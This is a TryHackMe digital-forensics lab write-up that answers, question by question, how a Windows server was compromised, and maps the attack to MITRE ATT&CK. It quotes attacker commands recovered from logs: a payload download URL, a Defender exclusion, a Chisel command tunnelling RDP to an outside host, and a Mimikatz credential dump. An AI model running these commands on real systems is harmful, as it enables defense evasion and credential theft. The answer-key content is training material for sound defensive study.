# Logless Hunt - DFIR Write-up

> **Platform:** TryHackMe  
> **Category:** Digital Forensics & Incident Response

# Introduction
This write-up documents the investigation of a Windows compromise using web access logs, PowerShell logs, RDP session logs, Task Scheduler logs and Windows Defender logs.

# Scenario
An attacker exploited a vulnerable web application, uploaded a web shell, executed PowerShell commands, established persistence through a scheduled task, tunneled RDP, and dumped credentials using Mimikatz.

---

# Task 3 – Initial Access | Web Access Logs

## Notes
- Apache logs: `C:\Apache24\logs`
- Used to identify scanning, exploitation and uploaded web shells.

### Q1. What is the title of the HR01-SRV web app hosted on port 80?
**Answer:** `Salary Raise Approver v0.1`

**Screenshot**
```md
![Q1](screenshots/task3-q1.png)
```

### Q2. Which IP performed an extensive web scan?
**Answer:** `10.10.23.190`

**Screenshot**
```md
![Q2](screenshots/task3-q2.png)
```

### Q3. Uploaded file path?
**Answer:** `C:\Apache24\htdocs\uploads\search.php`

**Screenshot**
```md
![Q3](screenshots/task3-q3.png)
```

### Q4. Uploaded malware?
**Answer:** `Web Shell`

**Screenshot**
```md
![Q4](screenshots/task3-q4.png)
```

**Learning Outcomes**
- Investigated Apache logs
- Detected reconnaissance
- Identified web shell upload

---

# Task 4 – From Web to RDP | PowerShell Logs

## Notes
- Console History
- Event ID 600
- Script Block Logging (4104)

### Q1. First command?
`whoami`

```md
![Q1](screenshots/task4-q1.png)
```

### Q2. Download URL?
`http://10.10.23.190:8080/httpd-proxy.exe`

```md
![Q2](screenshots/task4-q2.png)
```

### Q3. Defender exclusion?
```powershell
Add-MpPreference -ExclusionPath C:\Apache24
```

```md
![Q3](screenshots/task4-q3.png)
```

### Q4. Tunnelled service?
`RDP`

```md
![Q4](screenshots/task4-q4.png)
```

**Learning Outcomes**
- PowerShell forensics
- Payload download analysis
- Defender bypass detection

---

# Task 5 – Breached Admin | RDP Session Logs

## Notes
Important Event IDs:
- 21 Connect
- 24 Disconnect
- 25 Reconnect

### Q1.
`2025-01-23 17:00:12`

```md
![Q1](screenshots/task5-q1.png)
```

### Q2.
`HR01-SRV\Administrator`

```md
![Q2](screenshots/task5-q2.png)
```

### Q3.
`10.10.23.190`

```md
![Q3](screenshots/task5-q3.png)
```

### Q4.
`2025-01-23 17:16:46`

```md
![Q4](screenshots/task5-q4.png)
```

---

# Task 6 – Persistence | Scheduled Tasks

## Notes
Event IDs:
-100 Start
-106 Register
-129 Process Start

### Q1.
`Apache Proxy`

```md
![Q1](screenshots/task6-q1.png)
```

### Q2.
`2025-01-23 17:05:37`

```md
![Q2](screenshots/task6-q2.png)
```

### Q3.
`At system startup`

```md
![Q3](screenshots/task6-q3.png)
```

### Q4.
`C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389`

```md
![Q4](screenshots/task6-q4.png)
```

---

# Task 7 – Credential Access | Windows Defender

## Notes
Important IDs:
-1116 Detection
-1117 Quarantine
-5007 Configuration Change

### Q1.
`VirTool:Win64/Chisel.G`

```md
![Q1](screenshots/task7-q1.png)
```

### Q2.
`HackTool:Win32/Mimikatz!pz`

```md
![Q2](screenshots/task7-q2.png)
```

### Q3.
`mimi.exe`

```md
![Q3](screenshots/task7-q3.png)
```

### Q4.
`lsadump::lsa /inject`

```md
![Q4](screenshots/task7-q4.png)
```

# Attack Timeline

|Stage|Activity|
|---|---|
|Initial Access|Web scan and Web Shell upload|
|Execution|PowerShell|
|Defense Evasion|Windows Defender exclusion|
|Persistence|Scheduled Task|
|Remote Access|RDP Tunnel|
|Credential Access|Mimikatz|

# Key Skills
- Apache Log Analysis
- PowerShell Forensics
- RDP Investigation
- Scheduled Task Analysis
- Windows Defender Analysis

# MITRE ATT&CK Mapping

|Tactic|Technique|ID|
|---|---|---|
|Initial Access|Exploit Public-Facing Application|T1190|
|Persistence|Web Shell|T1505.003|
|Execution|PowerShell|T1059.001|
|Defense Evasion|Impair Defenses|T1562.001|
|Persistence|Scheduled Task|T1053.005|
|Lateral Movement|Remote Desktop Protocol|T1021.001|
|Credential Access|OS Credential Dumping|T1003|

# Conclusion
The investigation reconstructed the full attack chain from initial web exploitation to credential dumping by correlating multiple Windows forensic artifacts.
